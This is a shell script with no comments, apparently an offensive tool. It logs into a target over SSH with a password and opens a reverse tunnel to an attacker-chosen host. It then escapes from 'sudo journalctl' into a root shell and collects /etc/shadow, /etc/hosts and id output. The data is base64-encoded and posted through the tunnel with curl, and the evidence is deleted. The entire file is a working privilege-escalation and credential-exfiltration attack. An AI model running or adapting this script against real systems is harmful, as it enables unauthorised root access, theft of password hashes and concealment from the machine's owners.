HOST=$1
REVERSE_HOST=$2
REVERSE_PORT=$3
FILE_NAME=$4
PASSWORD=$5
root_file=/root/data
root_file_txt=${root_file}.txt
root_file_b64=${root_file}.b64

sshpass -p "${PASSWORD}" ssh ${HOST} -R ${REVERSE_PORT}:${REVERSE_HOST}:${REVERSE_PORT} << EOF
export TERM=xterm
SCREEN_NAME=bashit
screen -ls | grep -iw Detached | grep -w \${SCREEN_NAME} | cut -d. -f1 | awk '{print \$1}' | xargs kill
screen -dmS \${SCREEN_NAME}
screen -S \${SCREEN_NAME} -p 0 -X stuff "sudo \$(which journalctl)^M"
sleep 2
screen -S \${SCREEN_NAME} -p 0 -X stuff "!/bin/bash^M"
screen -S \${SCREEN_NAME} -p 0 -X stuff "id >> ${root_file_txt};^M"
screen -S \${SCREEN_NAME} -p 0 -X stuff "cat /etc/shadow >> ${root_file_txt};^M"
screen -S \${SCREEN_NAME} -p 0 -X stuff "cat /etc/hosts >> ${root_file_txt};^M"
screen -S \${SCREEN_NAME} -p 0 -X stuff "cat ${root_file_txt} | base64 >> ${root_file_b64};^M"
screen -S \${SCREEN_NAME} -p 0 -X stuff "curl -X POST -i -F "filename=@${root_file_b64}" -F "name=${FILE_NAME}" 127.0.0.1:5664/^M"
screen -S \${SCREEN_NAME} -p 0 -X stuff "rm ${root_file_txt}; rm ${root_file_b64}^M"
sleep 3
screen -X -S \${SCREEN_NAME} kill
EOF